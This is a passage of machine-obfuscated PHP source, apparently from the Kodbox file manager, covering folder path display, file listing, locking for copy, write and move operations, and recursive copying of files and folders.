groupPathDisplay(&$ºÄ‡¿ÍÍ) { $ËÒÜ…–é =& $_SERVER[ä¿÷‹µ±]; if ($ºÄ‡¿ÍÍ[$ËÒÜ…–é[411]] != self::TYPE_GROUP) { return; } $ñú¿´•Ó = Model($ËÒÜ…–é[522])->getInfo($ºÄ‡¿ÍÍ[$ËÒÜ…–é[505]]); $¿£»Ğ† = $this->parentLevelArray($ñú¿´•Ó[$ËÒÜ…–é[521]]); $Ñò¼«Áë = $ËÒÜ…–é[12]; foreach ($¿£»Ğ† as $ê‡»¶£ç) { $ÓÂÅå½§ = Model($ËÒÜ…–é[522])->getInfo($ê‡»¶£ç); $Ñò¼«Áë .= $ÓÂÅå½§[$ËÒÜ…–é[86]][$ËÒÜ…–é[402]] . $ËÒÜ…–é[50]; } $ºÄ‡¿ÍÍ[$ËÒÜ…–é[523]] = $ñú¿´•Ó[$ËÒÜ…–é[432]]; $ºÄ‡¿ÍÍ[$ËÒÜ…–é[524]] = $ñú¿´•Ó[$ËÒÜ…–é[521]]; $ºÄ‡¿ÍÍ[$ËÒÜ…–é[525]] = $ñú¿´•Ó[$ËÒÜ…–é[526]]; $ºÄ‡¿ÍÍ[$ËÒÜ…–é[527]] = $Ñò¼«Áë . $ñú¿´•Ó[$ËÒÜ…–é[86]][$ËÒÜ…–é[402]]; } protected function _listAppendPath(&$¾Şƒ«•è, $¢Í…û£ = false) { $¿­ÈºÚ =& $_SERVER[ä¿÷‹µ±]; static $â»ÔÖñÑ = array(); $–ŠÂËèç = array(); $ú’Ê¬À‰ = array(); if ($¢Í…û£) { return $â»ÔÖñÑ; } foreach ($¾Şƒ«•è as &$×Ìı½œ) { $Ò—ü¯ğã = $×Ìı½œ[$¿­ÈºÚ[402]]; if ($×Ìı½œ[$¿­ÈºÚ[410]] == $¿­ÈºÚ[88] && $×Ìı½œ[$¿­ÈºÚ[432]] != 0) { $â»ÔÖñÑ[$Ò—ü¯ğã] = $×Ìı½œ[$¿­ÈºÚ[32]]; } if ($×Ìı½œ[$¿­ÈºÚ[410]] == $¿­ÈºÚ[88] && $×Ìı½œ[$¿­ÈºÚ[432]] == 0 && !isset($â»ÔÖñÑ[$Ò—ü¯ğã])) { $â»ÔÖñÑ[$Ò—ü¯ğã] = $this->_listAppendPathRoot($×Ìı½œ, array()); } if (isset($ú’Ê¬À‰[$×Ìı½œ[$¿­ÈºÚ[521]]])) { continue; } $ú’Ê¬À‰[$×Ìı½œ[$¿­ÈºÚ[521]]] = !0; $„Å¨úŒ¥ = $this->parentLevelArray($×Ìı½œ[$¿­ÈºÚ[521]]); foreach ($„Å¨úŒ¥ as $ö¦§ä‰€ => $áè¢ª«¨) { if (isset($â»ÔÖñÑ[$áè¢ª«¨])) { continue; } if ($ö¦§ä‰€ == 0) { $â»ÔÖñÑ[$áè¢ª«¨] = $this->_listAppendPathRoot($×Ìı½œ, $„Å¨úŒ¥); } if ($ö¦§ä‰€ != 0) { $–ŠÂËèç[] = $áè¢ª«¨; } } } unset($×Ìı½œ); $–ŠÂËèç = array_unique($–ŠÂËèç); if (count($–ŠÂËèç) > 0) { $™ƒ†¢‘ = array($¿­ÈºÚ[417] => array($¿­ÈºÚ[418], $–ŠÂËèç)); if (count($–ŠÂËèç) == 1) { $ÔÀÓüÉÒ = $this->sourceInfo($–ŠÂËèç[0]); $â¼şÊÕ = is_array($ÔÀÓüÉÒ) ? array($ÔÀÓüÉÒ) : !1; } else { $â¼şÊÕ = $this->field($¿­ÈºÚ[528])->where($™ƒ†¢‘)->select(); } if (!$â¼şÊÕ) { $â¼şÊÕ = array(); } foreach ($â¼şÊÕ as $İü¡âš±) { $â»ÔÖñÑ[$İü¡âš±[$¿­ÈºÚ[402]]] = $İü¡âš±[$¿­ÈºÚ[32]]; } } $º“…×ƒœ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ãÃ—˜ì¡ = array(); foreach ($¾Şƒ«•è as &$×Ìı½œ) { $¬é’İÎ™ = $×Ìı½œ[$¿­ÈºÚ[521]]; $¯ôÈÈëœ = $¿­ÈºÚ[12]; if (isset($ãÃ—˜ì¡[$¬é’İÎ™])) { $¯ôÈÈëœ = $ãÃ—˜ì¡[$¬é’İÎ™]; } else { $„Å¨úŒ¥ = $this->parentLevelArray($×Ìı½œ[$¿­ÈºÚ[521]]); foreach ($„Å¨úŒ¥ as $ö¦§ä‰€ => $áè¢ª«¨) { if (isset($â»ÔÖñÑ[$áè¢ª«¨])) { $¯ôÈÈëœ .= $â»ÔÖñÑ[$áè¢ª«¨] . $¿­ÈºÚ[8]; } } $ãÃ—˜ì¡[$¬é’İÎ™] = $¯ôÈÈëœ; } $¯ôÈÈëœ .= $×Ìı½œ[$¿­ÈºÚ[32]]; if ($×Ìı½œ[$¿­ÈºÚ[410]] == $¿­ÈºÚ[88]) { $¯ôÈÈëœ .= $¿­ÈºÚ[8]; } $×Ìı½œ[$¿­ÈºÚ[519]] = str_replace($¿­ÈºÚ[529], $¿­ÈºÚ[8], $¯ôÈÈëœ); if ($×Ìı½œ[$¿­ÈºÚ[432]] == $¿­ÈºÚ[197]) { $×Ìı½œ[$¿­ÈºÚ[32]] = trim($â»ÔÖñÑ[$×Ìı½œ[$¿­ÈºÚ[402]]], $¿­ÈºÚ[8]); $×Ìı½œ[$¿­ÈºÚ[519]] = $×Ìı½œ[$¿­ÈºÚ[32]] . $¿­ÈºÚ[8]; } if (intval($×Ìı½œ[$¿­ÈºÚ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($×Ìı½œ, $„Å¨úŒ¥, $º“…×ƒœ); } } unset($×Ìı½œ); return $¾Şƒ«•è; } private function _listAppendPathRecycle(&$ã—ŞĞË, $©Ÿ‘êùø, $‹Îƒ‹‹–) { $‘»•İ½î =& $_SERVER[ä¿÷‹µ±]; if (!in_array($‹Îƒ‹‹–, $©Ÿ‘êùø) && $ã—ŞĞË[$‘»•İ½î[402]] != $‹Îƒ‹‹–) { return; } $­…ãğçÉ = explode($‘»•İ½î[8], trim($ã—ŞĞË[$‘»•İ½î[519]], $‘»•İ½î[8])); $…àØ×³ı = implode($‘»•İ½î[8], array_slice($­…ãğçÉ, 2)); $ã—ŞĞË[$‘»•İ½î[519]] = $‘»•İ½î[8] . LNG($‘»•İ½î[530]) . $‘»•İ½î[8] . ltrim($…àØ×³ı, $‘»•İ½î[8]); $ã—ŞĞË[$‘»•İ½î[521]] = $‘»•İ½î[531] . implode($‘»•İ½î[50], array_slice($©Ÿ‘êùø, 1)) . $‘»•İ½î[50]; if ($ã—ŞĞË[$‘»•İ½î[402]] == $‹Îƒ‹‹–) { $ã—ŞĞË[$‘»•İ½î[521]] = $‘»•İ½î[531]; $ã—ŞĞË[$‘»•İ½î[432]] = $‘»•İ½î[197]; $ã—ŞĞË[$‘»•İ½î[32]] = LNG($‘»•İ½î[530]); } $ã—ŞĞË[$‘»•İ½î[532]] = $‘»•İ½î[533]; } protected function _listAppendPathRoot(&$û²¿‰¸Ò, $­¡ê·“İ) { $²ÆùšŠ³ =& $_SERVER[ä¿÷‹µ±]; static $‰Ö€éú¸ = false; $÷‡îá²ü = $²ÆùšŠ³[12]; if ($û²¿‰¸Ò[$²ÆùšŠ³[411]] == self::TYPE_USER) { if (defined($²ÆùšŠ³[475]) && $û²¿‰¸Ò[$²ÆùšŠ³[505]] == USER_ID) { $÷‡îá²ü = LNG($²ÆùšŠ³[534]); if ($‰Ö€éú¸ === !1) { $»°Õö‰ = Model($²ÆùšŠ³[535])->getInfoFull(USER_ID); $‰Ö€éú¸ = _get($»°Õö‰, $²ÆùšŠ³[536], $²ÆùšŠ³[12]); } if ($­¡ê·“İ && $­¡ê·“İ[0] == $‰Ö€éú¸ || !$­¡ê·“İ && $û²¿‰¸Ò[$²ÆùšŠ³[402]] == $‰Ö€éú¸) { $÷‡îá²ü = LNG($²ÆùšŠ³[537]); $û²¿‰¸Ò[$²ÆùšŠ³[538]] = $²ÆùšŠ³[539]; } if (!$­¡ê·“İ) { $û²¿‰¸Ò[$²ÆùšŠ³[32]] = $÷‡îá²ü; } } else { $¹øÌÌ„ô = Model($²ÆùšŠ³[513])->getInfoSimple($û²¿‰¸Ò[$²ÆùšŠ³[505]]); $÷‡îá²ü = LNG($²ÆùšŠ³[540]) . $²ÆùšŠ³[162] . $¹øÌÌ„ô[$²ÆùšŠ³[32]] . $²ÆùšŠ³[164]; $û²¿‰¸Ò[$²ÆùšŠ³[541]] = array($²ÆùšŠ³[32] => $¹øÌÌ„ô[$²ÆùšŠ³[32]], $²ÆùšŠ³[542] => $¹øÌÌ„ô[$²ÆùšŠ³[542]], $²ÆùšŠ³[543] => $¹øÌÌ„ô[$²ÆùšŠ³[543]]); } } else { if ($û²¿‰¸Ò[$²ÆùšŠ³[411]] == self::TYPE_GROUP) { $¹øÌÌ„ô = Model($²ÆùšŠ³[522])->getInfoSimple($û²¿‰¸Ò[$²ÆùšŠ³[505]]); $÷‡îá²ü = $¹øÌÌ„ô[$²ÆùšŠ³[32]]; } else { if ($û²¿‰¸Ò[$²ÆùšŠ³[411]] == self::TYPE_SYSTEM) { $÷‡îá²ü = $²ÆùšŠ³[544]; } } } $÷‡îá²ü = $÷‡îá²ü ? $²ÆùšŠ³[8] . $÷‡îá²ü . $²ÆùšŠ³[8] : $²ÆùšŠ³[8]; return $÷‡îá²ü; } protected function _listAppendUser(&$ÌßÙñ€) { $Ù–İæš =& $_SERVER[ä¿÷‹µ±]; $øšåé®„ = array_to_keyvalue($ÌßÙñ€, $Ù–İæš[12], $Ù–İæš[454]); $ØôŠ‚³§ = array_to_keyvalue($ÌßÙñ€, $Ù–İæš[12], $Ù–İæš[456]); $úäû¥¾Ü = array_merge($øšåé®„, $ØôŠ‚³§); $ğ•¬«òÆ = Model($Ù–İæš[535])->userListInfo($úäû¥¾Ü); foreach ($ÌßÙñ€ as &$ªÓ—ªü´) { $¾²ìë¡ = $ªÓ—ªü´[$Ù–İæš[454]]; $ªÓ—ªü´[$Ù–İæš[454]] = $ğ•¬«òÆ[$¾²ìë¡] ? $ğ•¬«òÆ[$¾²ìë¡] : !1; $¾²ìë¡ = $ªÓ—ªü´[$Ù–İæš[456]]; $ªÓ—ªü´[$Ù–İæš[456]] = $ğ•¬«òÆ[$¾²ìë¡] ? $ğ•¬«òÆ[$¾²ìë¡] : !1; if (isset($ªÓ—ªü´[$Ù–İæš[466]]) && $ªÓ—ªü´[$Ù–İæš[466]][$Ù–İæš[545]]) { $‚…«‘ Ë = $GLOBALS[$Ù–İæš[6]][$Ù–İæš[89]][$Ù–İæš[546]]; if ($ªÓ—ªü´[$Ù–İæš[466]][$Ù–İæš[547]] <= time() - $‚…«‘ Ë) { $this->metaSet($ªÓ—ªü´[$Ù–İæš[402]], $Ù–İæš[545], null); $this->metaSet($ªÓ—ªü´[$Ù–İæš[402]], $Ù–İæš[547], null); unset($ªÓ—ªü´[$Ù–İæš[466]][$Ù–İæš[545]]); continue; } $©ÖÇó¥ë = $ªÓ—ªü´[$Ù–İæš[466]][$Ù–İæš[545]]; $ªÓ—ªü´[$Ù–İæš[466]][$Ù–İæš[548]] = Model($Ù–İæš[535])->getInfoSimpleOuter($©ÖÇó¥ë); } } unset($ªÓ—ªü´); } public function parentLevelArray($­ÓŸ³Ä—) { $µúÃ÷»ü =& $_SERVER[ä¿÷‹µ±]; $­ÓŸ³Ä— = explode($µúÃ÷»ü[50], trim($­ÓŸ³Ä—, $µúÃ÷»ü[50])); return array_remove_value($­ÓŸ³Ä—, $µúÃ÷»ü[197]); } public function listAll($ÂˆáŠ®) { $úõ€¢Ï½ =& $_SERVER[ä¿÷‹µ±]; $¥¶„¹® = $this->sourceInfo($ÂˆáŠ®); $çÜóÄê» = array($úõ€¢Ï½[549] => array($úõ€¢Ï½[550], $¥¶„¹®[$úõ€¢Ï½[521]] . $ÂˆáŠ® . $úõ€¢Ï½[551]), $úõ€¢Ï½[552] => 0); $õÇ¶ßß = $úõ€¢Ï½[553]; $¡‰òî® = "\114\x45\106\124\40\x4a\117\111\116\40{$this->tablePrefix}\151\157\x5f\x66\151\154\x65\x20\x66\x69\154\145\40\x6f\156\x20\x73\157\x75\162\143\x65\56\x66\151\154\145\111\x44\x20\x3d\40\x66\x69\x6c\145\x2e\146\151\154\145\x49\104"; $õÒ”à«¬ = $this->alias($úõ€¢Ï½[446])->field($õÇ¶ßß)->where($çÜóÄê»)->join($¡‰òî®)->select(); $this->_listAppendAuth($õÒ”à«¬); $this->_listAppendUser($õÒ”à«¬); $this->_listAppendPath($õÒ”à«¬); $õÒ”à«¬ = array_to_keyvalue($õÒ”à«¬, $úõ€¢Ï½[402]); $ü èÕÏô = "\x2f{$¥¶„¹®[$úõ€¢Ï½[32]]}\x2f"; $ü èÕÏô = $ü èÕÏô == $úõ€¢Ï½[529] ? $úõ€¢Ï½[8] : $ü èÕÏô; $”¹®½¹ = array(); foreach ($õÒ”à«¬ as $¿ÃÕèØ§ => $ƒ§ÛÏˆÇ) { $êğÜé¯Ñ = $this->parentLevelArray($ƒ§ÛÏˆÇ[$úõ€¢Ï½[521]]); array_shift($êğÜé¯Ñ); $ÒĞœ»ÌÑ = $ü èÕÏô; for ($Šï„ö¬ = 0; $Šï„ö¬ < count($êğÜé¯Ñ); $Šï„ö¬++) { $ÒĞœ»ÌÑ .= $õÒ”à«¬[$êğÜé¯Ñ[$Šï„ö¬]][$úõ€¢Ï½[32]] . $úõ€¢Ï½[8]; } $ÒĞœ»ÌÑ .= $ƒ§ÛÏˆÇ[$úõ€¢Ï½[32]]; if ($ƒ§ÛÏˆÇ[$úõ€¢Ï½[410]]) { $ÒĞœ»ÌÑ .= $úõ€¢Ï½[8]; } $ÒĞœ»ÌÑ = str_replace($úõ€¢Ï½[529], $úõ€¢Ï½[8], $ÒĞœ»ÌÑ); $ÒĞœ»ÌÑ = str_replace($úõ€¢Ï½[529], $úõ€¢Ï½[8], $ÒĞœ»ÌÑ); $èŸæÎŸ = array($úõ€¢Ï½[421] => str_replace($úõ€¢Ï½[529], $úõ€¢Ï½[8], $ÒĞœ»ÌÑ), $úõ€¢Ï½[554] => intval($ƒ§ÛÏˆÇ[$úõ€¢Ï½[410]]), $úõ€¢Ï½[86] => $this->pathInfoFilter($ƒ§ÛÏˆÇ)); if (!$ƒ§ÛÏˆÇ[$úõ€¢Ï½[410]]) { $èŸæÎŸ[$úõ€¢Ï½[468]] = $ƒ§ÛÏˆÇ[$úõ€¢Ï½[468]]; $èŸæÎŸ[$úõ€¢Ï½[87]] = $ƒ§ÛÏˆÇ[$úõ€¢Ï½[84]]; } $”¹®½¹[] = $èŸæÎŸ; } return $”¹®½¹; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($û²ôµ“›) { $Éù÷ûÍ† =& $_SERVER[ä¿÷‹µ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($Éù÷ûÍ†[555], $û²ôµ“›); $Ö¢ü÷Òë = 1; $this->_lockEvent($û²ôµ“›, array($Éù÷ûÍ†[556], $Éù÷ûÍ†[557]), $Ö¢ü÷Òë); $this->_lockParent($û²ôµ“›, array($Éù÷ûÍ†[557]), $Ö¢ü÷Òë); $this->_lockEvent($û²ôµ“›, array($Éù÷ûÍ†[558], $Éù÷ûÍ†[559]), $Ö¢ü÷Òë); $this->_lockCheckEnd($Éù÷ûÍ†[555], $û²ôµ“›); } public function lockCopyEnd($¬Ä¡¢Çµ) { $€Œ¶À«ˆ =& $_SERVER[ä¿÷‹µ±]; if (!$this->allowLock()) { return; } $»«®Šƒ£ = 0; $this->_lockEvent($¬Ä¡¢Çµ, array($€Œ¶À«ˆ[556], $€Œ¶À«ˆ[557]), $»«®Šƒ£); $this->_lockParent($¬Ä¡¢Çµ, array($€Œ¶À«ˆ[557]), $»«®Šƒ£); $this->_lockEvent($¬Ä¡¢Çµ, array($€Œ¶À«ˆ[558], $€Œ¶À«ˆ[559]), $»«®Šƒ£); } public function lockWriteStart($Õ²ÓïÈ, $ù°Á“ã = '') { $æ¿ÓÊ„… =& $_SERVER[ä¿÷‹µ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($æ¿ÓÊ„…[556], $Õ²ÓïÈ); $îüŞ®æ” = 1; $this->_lockKey($æ¿ÓÊ„…[560] . $Õ²ÓïÈ . $æ¿ÓÊ„…[10] . $ù°Á“ã, $îüŞ®æ”); $this->_lockEvent($Õ²ÓïÈ, array($æ¿ÓÊ„…[555], $æ¿ÓÊ„…[557]), $îüŞ®æ”); $this->_lockParent($Õ²ÓïÈ, array($æ¿ÓÊ„…[555], $æ¿ÓÊ„…[557]), $îüŞ®æ”); $this->_lockCheckEnd($æ¿ÓÊ„…[556], $Õ²ÓïÈ); } public function lockWriteEnd($€œÂÒ÷î, $ó¼ËÊ¤ú = '') { $æ‹øÍ¥İ =& $_SERVER[ä¿÷‹µ±]; if (!$this->allowLock()) { return; } $˜³Òï±ç = 0; $this->_lockKey($æ‹øÍ¥İ[560] . $€œÂÒ÷î . $æ‹øÍ¥İ[10] . $ó¼ËÊ¤ú, $˜³Òï±ç); $this->_lockEvent($€œÂÒ÷î, array($æ‹øÍ¥İ[555], $æ‹øÍ¥İ[557]), $˜³Òï±ç); $this->_lockParent($€œÂÒ÷î, array($æ‹øÍ¥İ[555], $æ‹øÍ¥İ[557]), $˜³Òï±ç); } public function lockMoveStart($œ¯¨Í“ã) { $£é¨ÁİÃ =& $_SERVER[ä¿÷‹µ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($£é¨ÁİÃ[557], $œ¯¨Í“ã); $Ø¼Çèßœ = 1; $this->_lockKey($£é¨ÁİÃ[561] . $œ¯¨Í“ã, $Ø¼Çèßœ); $this->_lockEvent($œ¯¨Í“ã, array($£é¨ÁİÃ[555], $£é¨ÁİÃ[556]), $Ø¼Çèßœ); $this->_lockParent($œ¯¨Í“ã, array($£é¨ÁİÃ[555], $£é¨ÁİÃ[557]), $Ø¼Çèßœ); $this->_lockEvent($œ¯¨Í“ã, array($£é¨ÁİÃ[562], $£é¨ÁİÃ[558], $£é¨ÁİÃ[559]), $Ø¼Çèßœ); $this->_lockCheckEnd($£é¨ÁİÃ[557], $œ¯¨Í“ã); } public function lockMoveEnd($¹ûîƒüÎ) { $Š™ßõ‘½ =& $_SERVER[ä¿÷‹µ±]; if (!$this->allowLock()) { return; } $ıíéãµÀ = 0; $this->_lockKey($Š™ßõ‘½[561] . $¹ûîƒüÎ, $ıíéãµÀ); $this->_lockEvent($¹ûîƒüÎ, array($Š™ßõ‘½[555], $Š™ßõ‘½[556]), $ıíéãµÀ); $this->_lockParent($¹ûîƒüÎ, array($Š™ßõ‘½[555], $Š™ßõ‘½[557]), $ıíéãµÀ); $this->_lockEvent($¹ûîƒüÎ, array($Š™ßõ‘½[562], $Š™ßõ‘½[558], $Š™ßõ‘½[559]), $ıíéãµÀ); } private function _lockCheck($Ì‹±ê«, $ÅŞ™­­) { $¥óÕä¾à =& $_SERVER[ä¿÷‹µ±]; $ø„´”–Ù = $this->sourceInfo($ÅŞ™­­); $à¨†ôŞµ = $Ì‹±ê« . $¥óÕä¾à[10] . $ÅŞ™­­; $this->_lockTimeStart[$à¨†ôŞµ] = timeFloat(); if (!is_array($ø„´”–Ù)) { return; } $—Ç©± = LNG($¥óÕä¾à[563]); CacheLock::setErrorMsg($¥óÕä¾à[162] . htmlspecialchars($ø„´”–Ù[$¥óÕä¾à[32]]) . $¥óÕä¾à[164] . $—Ç©±); $this->_lockKey($à¨†ôŞµ, 1); $this->_lockKey($à¨†ôŞµ, 0); $¸Ç¤æ¯ = array_reverse($this->parentLevelArray($ø„´”–Ù[$¥óÕä¾à[521]])); foreach ($¸Ç¤æ¯ as $°Ã¯¦¦) { $à¨†ôŞµ = $Ì‹±ê« . $¥óÕä¾à[564] . $°Ã¯¦¦; if (CacheLock::lockGet($¥óÕä¾à[565] . $à¨†ôŞµ)) { $ø„´”–Ù = $this->sourceInfo($°Ã¯¦¦); CacheLock::setErrorMsg($¥óÕä¾à[162] . htmlspecialchars($ø„´”–Ù[$¥óÕä¾à[32]]) . $¥óÕä¾à[164] . $—Ç©±); $this->_lockKey($à¨†ôŞµ, 1); $this->_lockKey($à¨†ôŞµ, 0); } } } private function _lockCheckEnd($Ä­ä¬û¾, $®Ê†åÖº) { $•ñ¼×Ç« =& $_SERVER[ä¿÷‹µ±]; $‘Ëó”“ = $Ä­ä¬û¾ . $•ñ¼×Ç«[10] . $®Ê†åÖº; CacheLock::setErrorMsg($•ñ¼×Ç«[378]); if (!isset($this->_lockTimeStart[$‘Ëó”“])) { return; } $•Ïä‘× = timeFloat() - $this->_lockTimeStart[$‘Ëó”“]; unset($this->_lockTimeStart[$‘Ëó”“]); if ($•Ïä‘× > 0.5) { unset(self::$cacheSourceInfo[$•ñ¼×Ç«[460] . $®Ê†åÖº]); } $Õ“Ä—Àü = $this->sourceInfo($®Ê†åÖº); if (!$Õ“Ä—Àü) { show_json(LNG($•ñ¼×Ç«[105]), !1); } } private function _lockParent($±õ­™ı§, $·€‹ö°, $Üï¥ä£Ï) { if (!$this->autoLockSet) { return; } $Ö”ª¦¤Á = $this->sourceInfo($±õ­™ı§); if (!is_array($Ö”ª¦¤Á)) { return; } $Íªùú¿Ï = array_reverse($this->parentLevelArray($Ö”ª¦¤Á[$_SERVER[ä¿÷‹µ±][521]])); foreach ($Íªùú¿Ï as $¥ğàÊö) { $this->_lockEvent($¥ğàÊö, $·€‹ö°, $Üï¥ä£Ï); } } private function _lockEvent($ÈéÎ¢Ö¤, $±Ş¨Ô­, $Ÿş’Ï–è) { $ÈÒÎ×§ô =& $_SERVER[ä¿÷‹µ±]; if (!$this->autoLockSet) { return; } foreach ($±Ş¨Ô­ as $‡ûğµı©) { $İÛ”Ñ­Á = $‡ûğµı© . $ÈÒÎ×§ô[10] . $ÈéÎ¢Ö¤; if ($Ÿş’Ï–è && CacheLock::lockGet($ÈÒÎ×§ô[565] . $İÛ”Ñ­Á)) { continue; } $this->_lockKey($İÛ”Ñ­Á, $Ÿş’Ï–è); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÀÁÖ®Ô½, $”„˜§¥ = 1) { $ç¸ÇùŠ‹ = $_SERVER[ä¿÷‹µ±][565] . md5($ÀÁÖ®Ô½); if ($”„˜§¥) { if (isset(self::$_lockItemArr[$ç¸ÇùŠ‹])) { return; } self::$_lockItemArr[$ç¸ÇùŠ‹] = 1; CacheLock::lock($ç¸ÇùŠ‹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ç¸ÇùŠ‹])) { return; } unset(self::$_lockItemArr[$ç¸ÇùŠ‹]); CacheLock::unlock($ç¸ÇùŠ‹); } } public function isParentOf($èéŞ­ñ, $ÅçÉ€òÛ) { $€‰åœö± =& $_SERVER[ä¿÷‹µ±]; $ÍÊ÷Ø = $this->sourceInfo($èéŞ­ñ); $‘èº¶åÒ = $this->sourceInfo($ÅçÉ€òÛ); $®‹íñ‰Á = $ÍÊ÷Ø[$€‰åœö±[521]] . $ÍÊ÷Ø[$€‰åœö±[402]] . $€‰åœö±[50]; $¯ÕÅ…€Ï = $‘èº¶åÒ[$€‰åœö±[521]] . $‘èº¶åÒ[$€‰åœö±[402]] . $€‰åœö±[50]; $Ğåğ¢Şä = strpos($¯ÕÅ…€Ï, $®‹íñ‰Á) === 0; return $Ğåğ¢Şä; } private $targetIsDelete = 0; public function copy($ºœõÄÛ, $Æ·€¾‡Ö, $…áÌß¨’ = REPEAT_REPLACE, $èÇ¼ˆ†Ğ = '') { $‰òÓî¦ó =& $_SERVER[ä¿÷‹µ±]; $ïÑÑĞŠ = $this->sourceInfo($ºœõÄÛ); $ùŒ˜×áí = $this->sourceInfo($Æ·€¾‡Ö); if (!$ïÑÑĞŠ || !$ùŒ˜×áí || $ùŒ˜×áí[$‰òÓî¦ó[410]] != $‰òÓî¦ó[88]) { return !1; } if ($this->isParentOf($ºœõÄÛ, $Æ·€¾‡Ö)) { return !1; } $À÷îÕÖİ = $èÇ¼ˆ†Ğ ? $èÇ¼ˆ†Ğ : $ïÑÑĞŠ[$‰òÓî¦ó[32]]; $this->lockCopyStart($ºœõÄÛ); $this->lockWriteStart($Æ·€¾‡Ö, $À÷îÕÖİ); $®îÊ¼’Æ = array($‰òÓî¦ó[566] => array(), $‰òÓî¦ó[567] => array(), $‰òÓî¦ó[568] => array()); $this->targetIsDelete = intval($ïÑÑĞŠ[$‰òÓî¦ó[431]]); $«…õú«‡ = $this->fileNameExistCache($Æ·€¾‡Ö, $ïÑÑĞŠ[$‰òÓî¦ó[32]]); $œà¢Ÿë© = $this->_copy($ºœõÄÛ, $Æ·€¾‡Ö, $…áÌß¨’, $®îÊ¼’Æ, !0, $èÇ¼ˆ†Ğ); $this->_childrenListClear(); $this->lockCopyEnd($ºœõÄÛ); $this->lockWriteEnd($Æ·€¾‡Ö, $À÷îÕÖİ); if ($ïÑÑĞŠ[$‰òÓî¦ó[410]] == $‰òÓî¦ó[88] && $«…õú«‡ == $œà¢Ÿë©) { $this->folderSizeResetChildren($«…õú«‡); } Model($‰òÓî¦ó[569])->addAll($®îÊ¼’Æ[$‰òÓî¦ó[567]], array(), !0); if ($«…õú«‡ != $œà¢Ÿë© || $ïÑÑĞŠ[$‰òÓî¦ó[410]] == $‰òÓî¦ó[88]) { Model($‰òÓî¦ó[570])->eventCopy($œà¢Ÿë©); } $this->saveAll($®îÊ¼’Æ[$‰òÓî¦ó[568]]); Model($‰òÓî¦ó[199])->linkAdd($®îÊ¼’Æ[$‰òÓî¦ó[566]]); $this->folderSizeReset($Æ·€¾‡Ö); $this->updateModifyTime($Æ·€¾‡Ö); return $œà¢Ÿë©; } private function _copy($•ßÛè¥È, $²ÁÎ¶Ú, $å¸¸ó·, &$ şĞû·, $ñöèì—, $¬€¹®½ = '') { $ˆŒ¾·Îò =& $_SERVER[ä¿÷‹µ±]; $èÙï¯Å¯ = $this->sourceInfoCache($•ßÛè¥È); $ˆÌü•¨ = $èÙï¯Å¯[$ˆŒ¾·Îò[410]] == $ˆŒ¾·Îò[88]; $Ãô¸‘ªº = $¬€¹®½ ? $¬€¹®½ : $èÙï¯Å¯[$ˆŒ¾·Îò[32]]; $ù½®ÚáÖ = $this->fileNameExistCache($²ÁÎ¶Ú, $Ãô¸‘ªº); if ($ñöèì—) { $this->_childrenAllMake($•ßÛè¥È); if ($ˆÌü•¨ && $ù½®ÚáÖ) { $this->_childrenAllMake($ù½®ÚáÖ); } } if (!$ù½®ÚáÖ) { return $this->_copyCreate($•ßÛè¥È, $²ÁÎ¶Ú, $Ãô¸‘ªº, $ şĞû·); } $’Š÷Ş€® = $ù½®ÚáÖ; if ($ˆÌü•¨) { if ($å¸¸ó· == REPEAT_RENAME_FOLDER) { $Ãô¸‘ªº = $this->fileNameAutoCache($²ÁÎ¶Ú, $Ãô¸‘ªº, $å¸¸ó·, $ˆÌü•¨); $’Š÷Ş€® = $this->_copyCreate($•ßÛè¥È, $²ÁÎ¶Ú, $Ãô¸‘ªº, $ şĞû·); } else { $¢Õôá­© = $this->_childrenList($•ßÛè¥È); foreach ($¢Õôá­© as $±™á¨ß) { $this->_copy($±™á¨ß[$ˆŒ¾·Îò[402]], $ù½®ÚáÖ, $å¸¸ó·, $ şĞû·, !1); } } } else { if ($å¸¸ó· == REPEAT_RENAME || $å¸¸ó· == REPEAT_RENAME_FOLDER) { $Ãô¸‘ªº = $this->fileNameAutoCache($²ÁÎ¶Ú, $Ãô¸‘ªº, $å¸¸ó·, $ˆÌü•¨); $’Š÷Ş€® = $this->_copyCreate($•ßÛè¥È, $²ÁÎ¶Ú, $Ãô¸‘ªº, $ şĞû·); } else { if ($å¸¸ó· == REPEAT_REPLACE) { $›è©ÃÜÁ = $this->sourceInfoCache($ù½®ÚáÖ); $¼èĞ¬Î¥ = $this->fileHistory($›è©ÃÜÁ, $èÙï¯Å¯[$ˆŒ¾·Îò[468]], $èÙï¯Å¯[$ˆŒ¾·Îò[76]]); if ($¼èĞ¬Î¥) { $ şĞû·[$ˆŒ¾·Îò[566]][] = $èÙï¯Å¯[$ˆŒ¾·Îò[468]]; } } else { if ($å¸¸ó· == REPEAT_SKIP) { } } } Hook::trigger($ˆŒ¾·Îò[571], array($ˆŒ¾·Îò[572], $èÙï¯Å¯, 0)); } return $’Š÷Ş€®; } private function _copyCreate($è•ú¸¸¿, $¶êù»éñ, $çØè½€ç, &$ì‘¹—§ß) { $¬•â½İ¿ =& $_SERVER[ä¿÷‹µ±]; $Œ†½¶Ú‹ = $this->sourceInfoCache($è•ú¸¸¿); $×Â¶Ù¬æ = $this->sourceInfoCache($¶êù»éñ); $œœÄñúè = $this->_makeItemData($Œ†½¶Ú‹, $×Â¶Ù¬æ, $çØè½€ç); Hook::trigger($¬•â½İ¿[573], $œœÄñúè); Hook::trigger($¬•â½İ¿[574], array($¬•â½İ¿[575], $œœÄñúè, 0)); $²¤ªÈş¤ = $this->add($œœÄñúè); $·ÑµÍ– = array($¬•â½İ¿[402] => $²¤ªÈş¤, $¬•â½İ¿[32] => $çØè½€ç); $this->_copyApplyMeta($·ÑµÍ–, $ì‘¹—§ß); if ($Œ†½¶Ú‹[$¬•â½İ¿[410]] != $¬•â½İ¿[88]) { $ì‘¹—§ß[$¬•â½İ¿[566]][] = $Œ†½¶Ú‹[$¬•â½İ¿[468]]; return $²¤ªÈş¤; } $óŒ †¦– = array(); $«‰Í±˜™ = array(); $this->_childrenListAll($è•ú¸¸¿, $óŒ †¦–); $ìÁ—ÌœŞ = count($óŒ †¦–); if 